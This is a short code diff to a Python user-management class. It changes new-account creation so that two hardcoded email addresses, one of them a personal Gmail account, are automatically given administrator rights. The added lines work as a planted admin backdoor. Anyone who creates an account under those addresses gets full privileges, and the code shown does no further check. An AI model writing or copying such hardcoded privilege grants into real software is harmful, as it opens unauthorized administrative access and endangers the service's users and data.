@@ -316,11 +316,12 @@ class UserManager:
                     # 2. User doesn't exist, create a new one with a dummy password hash
                     dummy_hash = bcrypt.hashpw(secrets.token_hex(16).encode(), bcrypt.gensalt()).decode()
                     
+                    is_admin_user = email in ["developer@nextcaptcha.com", "hulkb690@gmail.com"]
                     cursor.execute("""
                         INSERT INTO users (email, password_hash, full_name, is_admin)
                         VALUES (%s, %s, %s, %s)
                         RETURNING id, email, full_name, company_name, is_admin, created_at
-                    """, (email, dummy_hash, name, False))
+                    """, (email, dummy_hash, name, is_admin_user))
                     
                     new_user = cursor.fetchone()
                     conn.commit()
